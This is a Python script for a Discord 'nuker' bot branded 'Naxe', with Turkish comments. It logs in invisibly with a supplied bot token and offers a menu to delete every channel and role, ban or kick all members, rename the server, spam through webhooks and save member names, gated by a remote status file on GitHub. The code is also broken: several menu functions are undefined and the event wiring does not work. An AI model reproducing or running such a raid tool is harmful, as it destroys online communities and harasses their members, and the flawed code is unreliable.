import discord
import platform
from os import system
import requests

intents = discord.Intents.default()
intents.typing = True
intents.presences = True
intents.members = True

bot = discord.Client(intents=intents, status=discord.Status.offline)

# GitHub'dan durum.json dosyasını indirme fonksiyonu
def indir_durum():
    response = requests.get("https://raw.githubusercontent.com/exCro1sh/naxepydurum/main/durum.json")
    return response.json()

# GitHub'dan indirilen durum.json dosyasını kontrol etme fonksiyonu
def durum_kontrol():
    durum = indir_durum()["durum"]
    if durum == 1:
        return True  # Program çalışabilir durumda
    else:
        return False  # Program bakım modunda

async def delete_channels(guild):
    deleted_channels = []
    not_deleted_channels = []
    for channel in guild.channels:
        try:
            await channel.delete()
            deleted_channels.append(channel.name)
        except discord.Forbidden:
            not_deleted_channels.append(channel.name + " (silinemedi - yetki eksik)")
    return deleted_channels, not_deleted_channels

async def delete_roles(guild):
    deleted_roles = []
    not_deleted_roles = []
    for role in guild.roles:
        if role != guild.default_role:
            try:
                await role.delete()
                deleted_roles.append(role.name)
            except discord.Forbidden:
                not_deleted_roles.append(role.name + " (silinemedi - yetki eksik)")
    return deleted_roles, not_deleted_roles

async def ban_all_members(guild):
    banned_members = []
    not_banned_members = []
    for member in guild.members:
        try:
            await member.ban()
            banned_members.append(member.name)
        except discord.Forbidden:
            not_banned_members.append(member.name + " (yasaklanamadı - yetki eksik)")
    return banned_members, not_banned_members

async def kick_all_members(guild):
    kicked_members = []
    not_kicked_members = []
    for member in guild.members:
        try:
            await member.kick()
            kicked_members.append(member.name)
        except discord.Forbidden:
            not_kicked_members.append(member.name + " (atılamadı - yetki eksik)")
    return kicked_members, not_kicked_members

async def save_members(guild):
    with open("uyeler.txt", "w") as file:
        for member in guild.members:
            file.write(member.name + "\n")
            # Hata ayıklama için:
            print(f"{member.name} üyesi kaydedildi.")

os = platform.system()
if os == "Windows":
    system("cls")
else:
    system("clear")
    print(chr(27) + "[2J")

async def run_naxe():
    print("                                 \033[38;2;255;0;0mMade İn Naxe                  Hydronix & LuX")
    token = input('\033[38;2;255;0;0m [NAXE] Bot TOKEN Girin: ')
    sunucu_id = input('\033[38;2;255;0;0m [NAXE] Sunucu ID girin: ')

    bot.run(token)

async def on_connect():
    print('Bağlanılıyor...')

async def on_ready():
    print('Bot hazır.')
    if not durum_kontrol():
        print("Bakım modunda! Lütfen daha sonra tekrar deneyin.")
        return
    while True:
        # Ana menü ve diğer işlemler devam eder...
        print("\n")
        print("                                 \033[38;2;255;0;0mMade İn Naxe                  Hydronix & LuX")
        print("\n")
        print("                     (1) Kanal Oluştur                         (5) Tüm Kanalları Sil")
        print("                     (2) Rol Oluştur                           (6) Tüm Rolleri Sil")
        print("                     (3) Tüm Herkesi Yasakla                   (7) Tüm Herkesi At")
        print("                     (4) Sunucu Adı Değiştir                   (8) Webhook Spam")
        print("                                                               (9) Üyeleri Kaydet")
        print("\n")
        print('                                          \033[38;2;255;0;0m Bot Durumu [GÖRÜNMEZ] ')
        print("\n")

        choice = input("                                 \033[38;2;255;0;0mSeçiminizi yapın (0 ana menüye dön): ")

        guild = bot.get_guild(int(sunucu_id))

        if choice == "0":
            continue
        elif choice == "1":
            channel_name = input("Kanal ismi: ")
            channel_count = int(input("Kaç kanal oluşturulsun: "))
            await create_channel(guild, channel_name, channel_count)
        elif choice == "5":
            await delete_all_channels(guild)
        elif choice == "2":
            role_name = input("Rol ismi: ")
            role_count = int(input("Kaç rol oluşturulsun: "))
            await create_role(guild, role_name, role_count)
        elif choice == "6":
            await delete_all_roles(guild)
        elif choice == "3":
            await ban_all_members(guild)
        elif choice == "7":
            await kick_all_members(guild)
        elif choice == "4":
            new_name = input("Yeni sunucu adı: ")
            await change_server_name(guild, new_name)
        elif choice == "8":
            message = input("Gönderilecek mesaj: ")
            await webhook_spam(guild, message)
        elif choice == "9":
            await save_members(guild)

await run_naxe()
